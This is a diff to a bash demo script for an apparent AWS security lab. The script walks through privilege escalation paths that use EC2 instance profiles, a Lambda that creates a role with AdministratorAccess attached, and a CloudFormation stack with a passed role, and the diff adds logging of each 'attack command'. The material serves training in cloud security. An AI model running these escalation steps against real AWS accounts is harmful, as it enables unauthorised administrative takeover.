@@ -3,7 +3,6 @@
 # Demo script for prod_role_with_multiple_privesc_paths module
 # This script demonstrates multiple privilege escalation paths
 
-set -e
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +10,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 echo -e "${YELLOW}=== Pathfinding-labs Multiple Privilege Escalation Paths Demo ===${NC}"
 echo "This demo shows multiple ways to escalate privileges using different AWS services"
@@ -59,6 +76,7 @@ echo -e "${YELLOW}Step 1: Assuming the role with multiple privilege escalation p
 echo "Role ARN: $PRIVESC_ROLE_ARN"
 
 # Assume the role
+show_attack_cmd aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo"
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role --role-arn "$PRIVESC_ROLE_ARN" --role-session-name "multiple-privesc-demo")
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
@@ -70,6 +88,7 @@ echo ""
 echo -e "${YELLOW}Step 3: Checking current permissions${NC}"
 # Check what we can do currently
 echo "Current caller identity:"
+show_cmd aws sts get-caller-identity
 aws sts get-caller-identity
 
 echo ""
@@ -119,6 +138,7 @@ else
 fi
 
 # Create EC2 instance
+show_attack_cmd aws ec2 run-instances --region us-west-2 --image-id $AMI_ID --instance-type t3.micro --iam-instance-profile Name="pl-EC2Admin" --user-data file:///tmp/ec2-userdata.sh --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=privesc-demo-ec2},{Key=Environment,Value=demo}]'
 aws ec2 run-instances --region us-west-2 \
     --image-id $AMI_ID \
     --instance-type t3.micro \
@@ -144,7 +164,7 @@ import json
 def lambda_handler(event, context):
     # Create a new admin role
     iam = boto3.client('iam')
-    
+
     try:
         # Create the role
         iam.create_role(
@@ -162,13 +182,13 @@ def lambda_handler(event, context):
                 ]
             })
         )
-        
+
         # Attach admin policy
         iam.attach_role_policy(
             RoleName='privesc-demo-lambda-admin-role',
             PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
         )
-        
+
         return {
             'statusCode': 200,
             'body': json.dumps('Lambda created admin role: privesc-demo-lambda-admin-role')
@@ -186,6 +206,7 @@ zip lambda_function.zip lambda_function.py
 cd - > /dev/null
 
 # Create Lambda function
+show_attack_cmd aws lambda create-function --function-name privesc-demo-lambda --runtime python3.9 --role "$LAMBDA_ROLE_ARN" --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --region us-west-2
 aws lambda create-function \
     --function-name privesc-demo-lambda \
     --runtime python3.9 \
@@ -201,6 +222,7 @@ if ! aws lambda wait function-active --function-name privesc-demo-lambda --regio
 fi
 
 # Invoke the Lambda function
+show_attack_cmd aws lambda invoke --function-name privesc-demo-lambda --region us-west-2 /tmp/lambda-response.json
 aws lambda invoke \
     --function-name privesc-demo-lambda \
     --region us-west-2 \
@@ -242,6 +264,7 @@ Outputs:
 EOF
 
 # Create CloudFormation stack
+show_attack_cmd aws cloudformation create-stack --stack-name privesc-demo-cf-stack --template-body file:///tmp/cf-template.yaml --capabilities CAPABILITY_NAMED_IAM --role-arn "$CF_ROLE_ARN" --region us-west-2
 aws cloudformation create-stack \
     --stack-name privesc-demo-cf-stack \
     --template-body file:///tmp/cf-template.yaml \
@@ -296,7 +319,7 @@ if aws sts assume-role --role-arn "$EC2_ADMIN_ROLE_ARN" --role-session-name "tes
     export AWS_ACCESS_KEY_ID=$(echo "$EC2_CREDS" | jq -r '.Credentials.AccessKeyId')
     export AWS_SECRET_ACCESS_KEY=$(echo "$EC2_CREDS" | jq -r '.Credentials.SecretAccessKey')
     export AWS_SESSION_TOKEN=$(echo "$EC2_CREDS" | jq -r '.Credentials.SessionToken')
-    
+
     USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
     if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
         echo -e "${GREEN}✓ EC2 admin role works! Can list users:${NC}"
@@ -304,7 +327,7 @@ if aws sts assume-role --role-arn "$EC2_ADMIN_ROLE_ARN" --role-session-name "tes
     else
         echo -e "${GREEN}✓ EC2 admin role works! (Admin access confirmed)${NC}"
     fi
-    
+
     # Reset credentials
     unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 else
@@ -319,7 +342,7 @@ if aws sts assume-role --role-arn "$LAMBDA_ADMIN_ROLE_ARN" --role-session-name "
     export AWS_ACCESS_KEY_ID=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.AccessKeyId')
     export AWS_SECRET_ACCESS_KEY=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SecretAccessKey')
     export AWS_SESSION_TOKEN=$(echo "$LAMBDA_CREDS" | jq -r '.Credentials.SessionToken')
-    
+
     USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
     if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
         echo -e "${GREEN}✓ Lambda admin role works! Can list users:${NC}"
@@ -327,7 +350,7 @@ if aws sts assume-role --role-arn "$LAMBDA_ADMIN_ROLE_ARN" --role-session-name "
     else
         echo -e "${GREEN}✓ Lambda admin role works! (Admin access confirmed)${NC}"
     fi
-    
+
     # Reset credentials
     unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 else
@@ -342,7 +365,7 @@ if aws sts assume-role --role-arn "$CF_ADMIN_ROLE_ARN" --role-session-name "test
     export AWS_ACCESS_KEY_ID=$(echo "$CF_CREDS" | jq -r '.Credentials.AccessKeyId')
     export AWS_SECRET_ACCESS_KEY=$(echo "$CF_CREDS" | jq -r '.Credentials.SecretAccessKey')
     export AWS_SESSION_TOKEN=$(echo "$CF_CREDS" | jq -r '.Credentials.SessionToken')
-    
+
     USER_LIST=$(aws iam list-users --max-items 5 --query 'Users[].UserName' --output text 2>/dev/null)
     if [ -n "$USER_LIST" ] && [ "$USER_LIST" != "None" ]; then
         echo -e "${GREEN}✓ CloudFormation admin role works! Can list users:${NC}"
@@ -350,7 +373,7 @@ if aws sts assume-role --role-arn "$CF_ADMIN_ROLE_ARN" --role-session-name "test
     else
         echo -e "${GREEN}✓ CloudFormation admin role works! (Admin access confirmed)${NC}"
     fi
-    
+
     # Reset credentials
     unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 else
@@ -360,6 +383,14 @@ fi
 echo ""
 echo -e "${GREEN}=== Demo Complete ===${NC}"
 echo "This demonstrates multiple privilege escalation paths using EC2, Lambda, and CloudFormation."
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo ""
 echo -e "${YELLOW}To clean up the changes made by this demo, run:${NC}"
 echo "./cleanup_attack.sh"
